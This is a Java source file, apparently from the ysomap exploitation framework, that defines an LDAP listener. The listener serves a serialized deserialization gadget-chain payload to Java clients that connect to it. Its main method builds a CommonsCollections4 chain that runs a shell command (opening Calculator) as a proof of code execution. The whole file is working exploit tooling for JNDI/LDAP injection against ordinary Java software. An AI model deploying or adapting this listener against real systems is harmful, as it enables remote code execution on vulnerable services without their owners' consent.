package ysomap.core.exploit.ldap;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import ysomap.annotation.*;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Exploit;
import ysomap.core.bean.Payload;
import ysomap.core.exploit.ldap.component.LocalChainOperationInterceptor;
import ysomap.core.gadget.payload.collections.CommonsCollections4;
import ysomap.serializer.Serializer;
import ysomap.serializer.SerializerFactory;
import ysomap.util.Logger;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

/**
 * @author wh1t3P1g
 * @since 2020/2/29
 */
@SuppressWarnings({"rawtypes"})
@Exploits
@Authors({Authors.MBECHLER})
@Require(bullets = {"all gadgets"})
@Dependencies({"need to set a gadget"})
public class LDAPLocalChainListener extends Exploit {

    @NotNull
    @Require(name = "lport", type = "int", detail = "LDAP Server listening port")
    public String lport = "1389";

    @NotNull
    private Object payload = null;
    private String payloadName;

    private InMemoryDirectoryServer ds;

    @Override
    public void work() {
        InMemoryDirectoryServerConfig config = null;
        try {
            config = new InMemoryDirectoryServerConfig("dc=example,dc=com");
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    Integer.parseInt(lport),
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            Serializer serializer = SerializerFactory.createSerializer("default");
            byte[] bytes = (byte[]) serializer.serialize(payload);

            config.addInMemoryOperationInterceptor(new LocalChainOperationInterceptor(bytes));
            ds = new InMemoryDirectoryServer(config);
            Logger.success("LDAPLocalChainListener listening on 0.0.0.0:" + lport); //$NON-NLS-1$
            ds.startListening();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void stop() {
        ds.closeAllConnections(false);
        ds.close();
        exit = true;
        Logger.success("LDAPLocalChain Listener stopped");
    }

    @Override
    public String toString() {
        return "LDAPLocalChainListener{" +
                "lport='" + lport + '\'' +
                ", payloadName='" + payloadName + '\'' +
                '}';
    }

    public static void main(String[] args) throws Exception {
        Payload payload = new CommonsCollections4();
        Bullet bullet = (Bullet) payload.getDefaultBullet("open /System/Applications/Calculator.app");
        payload.setBullet(bullet);
        Object obj = payload.getObject();
        LDAPLocalChainListener ldap = new LDAPLocalChainListener();
        ldap.set("payload", obj);
        ldap.set("lport", "1389");
        ldap.run();
    }
}
